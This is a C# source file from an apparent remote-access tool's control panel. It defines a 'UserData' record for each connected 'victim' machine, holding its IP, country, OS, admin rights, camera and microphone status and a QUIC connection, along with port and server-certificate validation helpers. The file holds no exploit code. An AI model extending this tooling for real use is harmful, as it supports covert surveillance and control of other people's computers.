using System;
using System.ComponentModel;
using System.IO;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Security.Principal;
using System.Net.Quic;
using System.Text.Json.Serialization;

namespace KryakApp.Services
{
    public class Common()
    {
        static public bool IsAdministrator()
        {
            using var identity = WindowsIdentity.GetCurrent();
            var principal = new WindowsPrincipal(identity);
            return principal.IsInRole(WindowsBuiltInRole.Administrator);
        }
    }

    public class UserData : INotifyPropertyChanged
    {
        private string _userIPAddress = string.Empty;
        private string _victimTag = string.Empty;
        private string _userName = string.Empty;
        private string _country = string.Empty;
        private string _os = string.Empty;
        private bool _admin;
        private bool _cam;
        private bool _mic;
        private string _ping = string.Empty;
        private QuicConnection? _client;
        public string UserIPAddress
        {
            get => _userIPAddress;
            set => Set(ref _userIPAddress, value);
        }

        public string Username
        {
            get => _userName;
            set => Set(ref _userName, value);
        }

        public string VictimTag
        {
            get => _victimTag;
            set => Set(ref _victimTag, value);
        }

        public string Country
        {
            get => _country;
            set => Set(ref _country, value);
        }

        public string UserOS
        {
            get => _os;
            set => Set(ref _os, value);
        }

        public bool AdminStatus
        {
            get => _admin;
            set => Set(ref _admin, value);
        }

        public bool CameraStatus
        {
            get => _cam;
            set => Set(ref _cam, value);
        }

        public bool MicrophoneStatus
        {
            get => _mic;
            set => Set(ref _mic, value);
        }

        public string Ping
        {
            get => _ping;
            set => Set(ref _ping, value);
        }
        [JsonIgnore]
        public QuicConnection? Client
        {
            get => _client;
            set => Set(ref _client, value);
        }

        public event PropertyChangedEventHandler? PropertyChanged;

        protected void OnPropertyChanged([CallerMemberName] string? name = null)
            => PropertyChanged?.Invoke(this, new PropertyChangedEventArgs(name));

        protected bool Set<T>(ref T field, T value, [CallerMemberName] string? name = null)
        {
            if (Equals(field, value))
                return false;

            field = value;
            OnPropertyChanged(name);
            return true;
        }
    }

    public static class Validation
    {
        public static bool IsValidPort(int port, out string error)
        {
            error = "";

            if (port is < 1 or > 65535)
            {
                error = "Please enter a valid port number (1–65535).";
                return false;
            }

            return true;
        }

        public static bool IsValidCertificatePath(string path, out string error)
        {
            error = "";

            if (string.IsNullOrWhiteSpace(path))
            {
                error = "Certificate path cannot be empty.";
                return false;
            }

            if (!File.Exists(path))
            {
                error = "The specified certificate file does not exist.";
                return false;
            }

            string ext = Path.GetExtension(path).ToLowerInvariant();
            if (ext is not ".pfx" and not ".p12")
            {
                error = "Unsupported certificate format. Please use a .pfx or .p12 file.";
                return false;
            }

            return true;
        }

        public static bool TryLoadServerCertificate(
            string path,
            string password,
            out X509Certificate2? certificate,
            out string error)
        {
            certificate = null;
            error = "";

            try
            {
                using X509Certificate2 temp = new(path, password);

                if (!temp.HasPrivateKey)
                {
                    error = "The certificate does not contain a private key.";
                    return false;
                }

                DateTime now = DateTime.Now;
                if (now < temp.NotBefore || now > temp.NotAfter)
                {
                    error = "The certificate is expired or not yet valid.";
                    return false;
                }

                if (!IsValidForServerAuth(temp))
                {
                    error = "The certificate is not valid for server authentication.";
                    return false;
                }

                certificate = new X509Certificate2(temp);
                return true;
            }
            catch (CryptographicException)
            {
                error = "Failed to load the certificate. Please check the password and file format.";
                return false;
            }
            catch (Exception ex)
            {
                error = $"Unexpected error: {ex.Message}";
                return false;
            }
        }

        private static bool IsValidForServerAuth(X509Certificate2 cert)
        {
            X509EnhancedKeyUsageExtension? eku = cert.Extensions
                .OfType<X509EnhancedKeyUsageExtension>()
                .FirstOrDefault();

            if (eku == null)
                return true;

            return eku.EnhancedKeyUsages
                .OfType<Oid>()
                .Any(o => o.Value == "1.3.6.1.5.5.7.3.1");
        }
    }
}
